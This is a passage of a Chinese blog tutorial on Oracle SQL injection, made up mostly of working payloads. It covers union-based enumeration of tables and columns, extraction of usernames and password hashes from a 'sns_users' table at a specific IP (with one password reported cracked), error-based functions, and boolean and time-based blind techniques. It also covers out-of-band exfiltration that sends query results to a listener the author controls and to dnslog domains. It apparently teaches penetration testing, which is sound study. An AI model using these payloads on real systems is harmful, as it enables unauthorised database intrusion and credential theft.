class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27; and column_name not in &#x27;AGENT_NAME&#x27;) from dual</span><br><span class=\"line\"></span><br><span class=\"line\">……………</span><br><span class=\"line\"></span><br><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27; and column_name not in &#x27;AGENT_NAME&#x27; and column_name not in &#x27;PROTOCOL&#x27; and column_name not in &#x27;SPARE1&#x27; and column_name not in &#x27;DB_USERNAME&#x27; and column_name not in &#x27;OID&#x27; and column_name &lt;&gt; &#x27;EVENTID&#x27; and column_name &lt;&gt; &#x27;NAME&#x27; and column_name &lt;&gt; &#x27;TABLE_OBJNO&#x27;) from dual</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">获取如下字段：</span><br><span class=\"line\">USER_NAME</span><br><span class=\"line\">AGENT_NAME</span><br><span class=\"line\">PROTOCOL</span><br><span class=\"line\">SPARE1</span><br><span class=\"line\">DB_USERNAME</span><br><span class=\"line\">OID</span><br><span class=\"line\">EVENTID</span><br><span class=\"line\">NAME</span><br><span class=\"line\">TABLE_OBJNO</span><br><span class=\"line\">USAGE</span><br><span class=\"line\">USER_PWD</span><br><span class=\"line\">…………</span><br></pre></td></tr></table></figure>\n<h3 id=\"模糊搜索查询-1\"><a href=\"#模糊搜索查询-1\" class=\"headerlink\" title=\"模糊搜索查询\"></a>模糊搜索查询</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1 and column_name like &#x27;%USER%&#x27;) from dual</span><br><span class=\"line\"></span><br><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1 and column_name like &#x27;%USER%&#x27; and column_name &lt;&gt; &#x27;USER_NAME&#x27;) from dual</span><br></pre></td></tr></table></figure>\n<h2 id=\"8、查询数据库数据\"><a href=\"#8、查询数据库数据\" class=\"headerlink\" title=\"8、查询数据库数据\"></a>8、查询数据库数据</h2><p>获取账号密码字段内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355758027-eb920ce1-1667-40c4-9703-bf055011ce09.png#align=left&display=inline&height=332&margin=%5Bobject%2Object%5D&name=image.png&originHeight=664&originWidth=2436&size=124453&status=done&style=none&width=1218\" alt=\"image.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1 and USER_NAME &lt;&gt; &#x27;zhong&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355803061-53c045a9-600d-4231-911b-a0b145fd8d32.png#align=left&display=inline&height=308&margin=%5Bobject%2Object%5D&name=image.png&originHeight=616&originWidth=2470&size=127349&status=done&style=none&width=1235\" alt=\"image.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1 and USER_NAME &lt;&gt; &#x27;zhong&#x27; and USER_NAME not in &#x27;hu&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355829407-d770aa94-c339-4686-8131-9c5b9910039e.png#align=left&display=inline&height=288&margin=%5Bobject%2Object%5D&name=image.png&originHeight=576&originWidth=2436&size=121972&status=done&style=none&width=1218\" alt=\"image.png\"><br>解密获取密码392118<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355905460-f2485164-b4a8-4419-a99f-9752107804b7.png#align=left&display=inline&height=390&margin=%5Bobject%2Object%5D&name=image.png&originHeight=780&originWidth=1526&size=108851&status=done&style=none&width=763\" alt=\"image.png\"></p>\n<h2 id=\"9、美化输出\"><a href=\"#9、美化输出\" class=\"headerlink\" title=\"9、美化输出\"></a>9、美化输出</h2><p>Oracle采用||进行数据连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:44768/new_list.php?id=-1 union select &#x27;用户名：&#x27;||USER_NAME,&#x27;密码：&#x27;||USER_PWD from &quot;sns_users&quot; where rownum=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627356270321-022d9ac4-944b-4251-9f20-fa13afadd1b9.png#align=left&display=inline&height=281&margin=%5Bobject%2Object%5D&name=image.png&originHeight=562&originWidth=2512&size=124098&status=done&style=none&width=1256\" alt=\"image.png\"></p>\n<h1 id=\"0x04-报错注入\"><a href=\"#0x04-报错注入\" class=\"headerlink\" title=\"0x04 报错注入\"></a>0x04 报错注入</h1><p>报错注入是一种通过函数报错前进行子查询获取数据，再通过错误页面回显的一种注入手法，下面介绍几种报错注入函数以及获取一些常见的获取数据，实际操作只需要将子查询内的查询语句进行替换即可。</p>\n<h2 id=\"1、ctxsys-drithsx-sn\"><a href=\"#1、ctxsys-drithsx-sn\" class=\"headerlink\" title=\"1、ctxsys.drithsx.sn()\"></a>1、ctxsys.drithsx.sn()</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#获取当前数据库用户 ORACLE1</span><br><span class=\"line\">?id=1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370671892-ba68c50c-4b25-48c6-8121-2ee170485de9.png#align=left&display=inline&height=357&margin=%5Bobject%2Object%5D&name=image.png&originHeight=714&originWidth=2512&size=177516&status=done&style=none&width=1256\" alt=\"image.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#获取数据库版本信息</span><br><span class=\"line\">?id=1 and 1=ctxsys.drithsx.sn(1,(select banner from sys.v_$version where rownum=1)) --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370745612-670ae342-fb32-42ff-8b48-bd894e0b6d3f.png#align=left&display=inline&height=341&margin=%5Bobject%2Object%5D&name=image.png&originHeight=682&originWidth=2492&size=195982&status=done&style=none&width=1246\" alt=\"image.png\"></p>\n<h2 id=\"2、XMLType\"><a href=\"#2、XMLType\" class=\"headerlink\" title=\"2、XMLType()\"></a>2、XMLType()</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464280011-c070c8c1-5831-4516-93a5-d9de8e4728b2.png#align=left&display=inline&height=466&margin=%5Bobject%2Object%5D&name=image.png&originHeight=932&originWidth=1860&size=83611&status=done&style=none&width=930\" alt=\"image.png\"></p>\n<h2 id=\"3、dbms-xdb-version-checkin\"><a href=\"#3、dbms-xdb-version-checkin\" class=\"headerlink\" title=\"3、dbms_xdb_version.checkin()\"></a>3、dbms_xdb_version.checkin()</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#获取数据库版本信息</span><br><span class=\"line\">?id=1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370853172-60c1003a-f2bc-45e7-88e4-e1dc5b544009.png#align=left&display=inline&height=352&margin=%5Bobject%2Object%5D&name=image.png&originHeight=704&originWidth=2466&size=181678&status=done&style=none&width=1233\" alt=\"image.png\"></p>\n<h2 id=\"4、bms-xdb-version-makeversioned\"><a href=\"#4、bms-xdb-version-makeversioned\" class=\"headerlink\" title=\"4、bms_xdb_version.makeversioned()\"></a>4、bms_xdb_version.makeversioned()</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#获取当前数据库用户 ORACLE1</span><br><span class=\"line\">?id=1 and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371068298-bf405b32-0774-4999-b59c-5f972ff993eb.png#align=left&display=inline&height=299&margin=%5Bobject%2Object%5D&name=image.png&originHeight=598&originWidth=2500&size=157266&status=done&style=none&width=1250\" alt=\"image.png\"></p>\n<h2 id=\"5、dbms-xdb-version-uncheckout\"><a href=\"#5、dbms-xdb-version-uncheckout\" class=\"headerlink\" title=\"5、dbms_xdb_version.uncheckout()\"></a>5、dbms_xdb_version.uncheckout()</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#获取数据库版本信息</span><br><span class=\"line\">?id=1 and (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371151615-1dc8551d-bb05-4b01-ab12-fb20b684f7b1.png#align=left&display=inline&height=305&margin=%5Bobject%2Object%5D&name=image.png&originHeight=610&originWidth=2464&size=184586&status=done&style=none&width=1232\" alt=\"image.png\"></p>\n<h2 id=\"6、dbms-utility-sqlid-to-sqlhash\"><a href=\"#6、dbms-utility-sqlid-to-sqlhash\" class=\"headerlink\" title=\"6、dbms_utility.sqlid_to_sqlhash()\"></a>6、dbms_utility.sqlid_to_sqlhash()</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#获取数据库版本信息</span><br><span class=\"line\">?id=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371240951-badc7016-575d-4a23-9d5b-24d99923c150.png#align=left&display=inline&height=306&margin=%5Bobject%2Object%5D&name=image.png&originHeight=612&originWidth=2500&size=190889&status=done&style=none&width=1250\" alt=\"image.png\"></p>\n<h2 id=\"7、ordsys-ord-dicom-getmappingxpath\"><a href=\"#7、ordsys-ord-dicom-getmappingxpath\" class=\"headerlink\" title=\"7、ordsys.ord_dicom.getmappingxpath()\"></a>7、ordsys.ord_dicom.getmappingxpath()</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and 1=ordsys.ord_dicom.getmappingxpath((select banner from sys.v_$version where rownum=1),user,user)--</span><br></pre></td></tr></table></figure>\n<h2 id=\"8、utl-inaddr\"><a href=\"#8、utl-inaddr\" class=\"headerlink\" title=\"8、utl_inaddr.*()\"></a>8、utl_inaddr.*()</h2><p>utl_inaddr（用于取得局域网或Internet环境中的主机名和IP地址）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627369182388-db5976e4-c62c-460c-a76e-4a3b9fdadf0e.png#align=left&display=inline&height=444&margin=%5Bobject%2Object%5D&name=image.png&originHeight=888&originWidth=1480&size=138926&status=done&style=none&width=740\" alt=\"image.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and 1=utl_inaddr.get_host_name((select user from dual)) --</span><br><span class=\"line\">?id=1 and 1=utl_inaddr.get_host_address((select user from dual)) --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464133762-13bb4b59-3f8f-466a-b970-082352b0484e.png#align=left&display=inline&height=398&margin=%5Bobject%2Object%5D&name=image.png&originHeight=796&originWidth=1692&size=57659&status=done&style=none&width=846\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464181708-702fd815-478b-488f-8c3a-565adb5fb2f4.png#align=left&display=inline&height=458&margin=%5Bobject%2Object%5D&name=image.png&originHeight=916&originWidth=1810&size=65997&status=done&style=none&width=905\" alt=\"image.png\"></p>\n<h1 id=\"0x05-布尔型盲注\"><a href=\"#0x05-布尔型盲注\" class=\"headerlink\" title=\"0x05 布尔型盲注\"></a>0x05 布尔型盲注</h1><p>常用猜解：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#猜长度</span><br><span class=\"line\">?id=1 and 6=(select length(user) from dual)--</span><br><span class=\"line\">#截取值猜ascii码</span><br><span class=\"line\">?id=1 and (select ascii(substr(user,1,1)) from dual)&gt;83</span><br><span class=\"line\">?id=1 and (select ascii(substr(user,1,1)) from dual)=83</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627358275597-570e4d7d-7594-4570-bd79-ff983c61706e.png#align=left&display=inline&height=380&margin=%5Bobject%2Object%5D&name=image.png&originHeight=760&originWidth=2404&size=187790&status=done&style=none&width=1202\" alt=\"image.png\"></p>\n<h2 id=\"1、decode函数布尔盲注\"><a href=\"#1、decode函数布尔盲注\" class=\"headerlink\" title=\"1、decode函数布尔盲注\"></a>1、decode函数布尔盲注</h2><p>decode(字段或字段的运算，值1，值2，值3）<br>这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3</p>\n<h3 id=\"测试用户名长度\"><a href=\"#测试用户名长度\" class=\"headerlink\" title=\"测试用户名长度\"></a>测试用户名长度</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:44768/new_list.php?id=1 and 6=(select length(user) from dual) --</span><br></pre></td></tr></table></figure>\n<h3 id=\"测试当前用户是否为SYSTEM\"><a href=\"#测试当前用户是否为SYSTEM\" class=\"headerlink\" title=\"测试当前用户是否为SYSTEM\"></a>测试当前用户是否为SYSTEM</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#如果是system用户则返回正常，不是则返回不正常</span><br><span class=\"line\">http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(user,&#x27;SYSTEM&#x27;,1,0) from dual) -- </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#使用substr截断，逐个字段进行猜解</span><br><span class=\"line\">http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,1,0) from dual) -- </span><br><span class=\"line\">?id=1 and 1=(select decode(substr(user,2,1),&#x27;Y&#x27;,1,0) from dual) -- </span><br><span class=\"line\">?id=1 and 1=(select decode(substr(user,3,1),&#x27;S&#x27;,1,0) from dual) --</span><br><span class=\"line\">?id=1 and 1=(select decode(substr(user,4,1),&#x27;T&#x27;,1,0) from dual) --</span><br><span class=\"line\">?id=1 and 1=(select decode(substr(user,5,1),&#x27;E&#x27;,1,0) from dual) --</span><br><span class=\"line\">?id=1 and 1=(select decode(substr(user,6,1),&#x27;M&#x27;,1,0) from dual) --</span><br><span class=\"line\"></span><br><span class=\"line\">#当然也可以配合ascii码进行猜解</span><br><span class=\"line\">?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,1,0) from dual) --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627366490187-723fa9dc-c6d7-4858-a429-d98bbe77cab4.png#align=left&display=inline&height=436&margin=%5Bobject%2Object%5D&name=image.png&originHeight=872&originWidth=2424&size=197040&status=done&style=none&width=1212\" alt=\"image.png\"></p>\n<h2 id=\"2、instr函数布尔盲注\"><a href=\"#2、instr函数布尔盲注\" class=\"headerlink\" title=\"2、instr函数布尔盲注\"></a>2、instr函数布尔盲注</h2><p>instr函数的应用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select instr(&#x27;abcdefgh&#x27;,&#x27;de&#x27;) position from dual;</span><br><span class=\"line\">#返回结果：4</span><br></pre></td></tr></table></figure>\n<p>盲注中的应用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:44768/new_list.php?id=1 and 1=(instr((select user from dual),&#x27;SYS&#x27;)) --</span><br><span class=\"line\">?id=1 and 4=(instr((select user from dual),&#x27;T&#x27;)) --</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x06-延时盲注\"><a href=\"#0x06-延时盲注\" class=\"headerlink\" title=\"0x06 延时盲注\"></a>0x06 延时盲注</h1><h2 id=\"1、检测漏洞存在\"><a href=\"#1、检测漏洞存在\" class=\"headerlink\" title=\"1、检测漏洞存在\"></a>1、检测漏洞存在</h2><p>DBMS_PIPE.RECEIVE_MESSAGE函数的作用是从指定管道获取消息。<br>具体用法为：<strong>DBMS_PIPE.RECEIVE_MESSAGE(‘pipename’,timeout)</strong><br><strong>pipename</strong>为varchar(128)的字符串，用以指定管道名称，在这里我们输入任意值即可。<br><strong>timeout</strong>为integer的可选输入参数，用来指定等待时间。<br>常用payload如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:44768/new_list.php?id=1 and 1=dbms_pipe.receive_message(&#x27;o&#x27;, 10)--</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627365780661-fefb7bcc-e426-4014-8c09-9803fbb76335.png#align=left&display=inline&height=421&margin=%5Bobject%2Object%5D&name=image.png&originHeight=842&originWidth=2528&size=312249&status=done&style=none&width=1264\" alt=\"image.png\"><br>如果页面延时10秒返回，即存在注入。</p>\n<h2 id=\"2、配合decode函数延时盲注\"><a href=\"#2、配合decode函数延时盲注\" class=\"headerlink\" title=\"2、配合decode函数延时盲注\"></a>2、配合decode函数延时盲注</h2><p>只需要将延时语句放入decode函数中即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#直接猜解字符</span><br><span class=\"line\">?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) --</span><br><span class=\"line\"></span><br><span class=\"line\">#通过ascii猜解字符</span><br><span class=\"line\">?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627366016814-7d8cdee4-c932-4907-87e0-017ae7f6296f.png#align=left&display=inline&height=506&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1012&originWidth=2146&size=293305&status=done&style=none&width=1073\" alt=\"image.png\"></p>\n<h2 id=\"3、使用其他延时查询来判断\"><a href=\"#3、使用其他延时查询来判断\" class=\"headerlink\" title=\"3、使用其他延时查询来判断\"></a>3、使用其他延时查询来判断</h2><p>如(select count(*) from all_objects) ，因为查询结果需要一定的时间，在无法使用dbms_pipe.receive_message()函数的情况下可以使用这个。具体操作只需要将decode()函数的返回结果进行替换即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#直接猜解字符</span><br><span class=\"line\">?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(select count(*) from all_objects),0) from dual) --</span><br><span class=\"line\"></span><br><span class=\"line\">#通过ascii猜解字符</span><br><span class=\"line\">?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,(select count(*) from all_objects),0) from dual) --</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x07-外带数据注入\"><a href=\"#0x07-外带数据注入\" class=\"headerlink\" title=\"0x07 外带数据注入\"></a>0x07 外带数据注入</h1><h2 id=\"1、url-http-request\"><a href=\"#1、url-http-request\" class=\"headerlink\" title=\"1、url_http.request()\"></a>1、url_http.request()</h2><p>使用此方法，用户需要有utl_http访问网络的权限<br>首先检测是否支持，页面返回正常则表示支持</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and exists (select count(*) from all_objects where object_name=&#x27;UTL_HTTP&#x27;) --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464342525-e4cd81f2-77a8-4a90-ace7-36aa714ccdaa.png#align=left&display=inline&height=369&margin=%5Bobject%2Object%5D&name=image.png&originHeight=738&originWidth=1854&size=42432&status=done&style=none&width=927\" alt=\"image.png\"><br>然后python起一个http服务，或者开启nc监听。这里我使用python开启一个服务：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -m http.server 4455</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464776325-cd84daca-3f18-48a5-86a3-9a92df1fdd05.png#align=left&display=inline&height=145&margin=%5Bobject%2Object%5D&name=image.png&originHeight=290&originWidth=1144&size=47561&status=done&style=none&width=572\" alt=\"image.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#子查询数据库版本信息并访问python起的http服务</span><br><span class=\"line\">?id=1 and utl_http.request(&#x27;http://192.168.100.130:4455/&#x27;||(select banner from sys.v_$version where rownum=1))=1--</span><br><span class=\"line\"></span><br><span class=\"line\">#http访问时可以将||进行URL编码</span><br><span class=\"line\">?id=1 and utl_http.request(&#x27;http://192.168.100.130:4455/&#x27;%7C%7C(select banner from sys.v_$version where rownum=1))=1--</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464897258-175be638-08f8-4355-8ce8-e2552bfdd355.png#align=left&display=inline&height=372&margin=%5Bobject%2Object%5D&name=image.png&originHeight=744&originWidth=1868&size=59899&status=done&style=none&width=934\" alt=\"image.png\"><br>可以看到成功获取了数据<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464921197-61542222-97e4-4941-b1d9-ca5bdcec6fe2.png#align=left&display=inline&height=234&margin=%5Bobject%2Object%5D&name=image.png&originHeight=468&originWidth=1454&size=124719&status=done&style=none&width=727\" alt=\"image.png\"></p>\n<h2 id=\"2、utl-inaddr-get-host-address-函数\"><a href=\"#2、utl-inaddr-get-host-address-函数\" class=\"headerlink\" title=\"2、utl_inaddr.get_host_address()函数\"></a>2、utl_inaddr.get_host_address()函数</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#使用dnslog外带数据</span><br><span class=\"line\">?id=1 and (select utl_inaddr.get_host_address((select user from dual)||&#x27;.eeaijt.dnslog.cn&#x27;) from dual)is not null --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627465955162-98de91a3-8382-4073-bcf3-18728762e3f1.png#align=left&display=inline&height=343&margin=%5Bobject%2Object%5D&name=image.png&originHeight=686&originWidth=1664&size=42677&status=done&style=none&width=832\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627465968725-e5b0236e-0e8d-4aa2-8556-eb6fbf6e935f.png#align=left&display=inline&height=283&margin=%5Bobject%2Object%5D&name=image.png&originHeight=566&originWidth=1680&size=59996&status=done&style=none&width=840\" alt=\"image.png\"></p>\n<h2 id=\"3、SYS-DBMS-LDAP-INIT-函数\"><a href=\"#3、SYS-DBMS-LDAP-INIT-函数\" class=\"headerlink\" title=\"3、SYS.DBMS_LDAP.INIT()函数\"></a>3、SYS.DBMS_LDAP.INIT()函数</h2><p>网上说是可以使用，我试着不行，收不到数据，不知道是不是环境问题。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and (select SYS.DBMS_LDAP.INIT((select user from dual)||&#x27;.51prg6.dnslog.cn&#x27;,80) from dual)is not null --</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1 and (select DBMS_LDAP.INIT((select user from dual)||&#x27;.51prg6.dnslog.cn&#x27;,80) from dual)is not null --</span><br></pre></td></tr></table></figure>\n<h2 id=\"4、HTTPURITYPE-函数\"><a href=\"#4、HTTPURITYPE-函数\" class=\"headerlink\" title=\"4、HTTPURITYPE()函数\"></a>4、HTTPURITYPE()函数</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and (select HTTPURITYPE(&#x27;http://192.168.100.130:4455/&#x27;||(select user from dual)).GETCLOB() FROM DUAL)is not null --</span><br></pre></td></tr></table></figure>\n<p>同样需要python起一个http服务，或者nc创建监听<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627466748565-80964d64-450b-46fc-8f89-77bdb55ce3cd.png#align=left&display=inline&height=419&margin=%5Bobject%2Object%5D&name=image.png&originHeight=838&originWidth=1878&size=78666&status=done&style=none&width=939\" alt=\"image.png\"><br>虽然访问404，但是同样成功外带数据。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627466760517-a4a23a26-b2d0-4ea8-96c9-3a7c5470b395.png#align=left&display=inline&height=230&margin=%5Bobject%2Object%5D&name=image.png&originHeight=460&originWidth=1454&size=97022&status=done&style=none&width=727\" alt=\"image.png\"></p>\n<h1 id=\"0x08-总结\"><a href=\"#0x08-总结\" class=\"headerlink\" title=\"0x08 总结\"></a>0x08 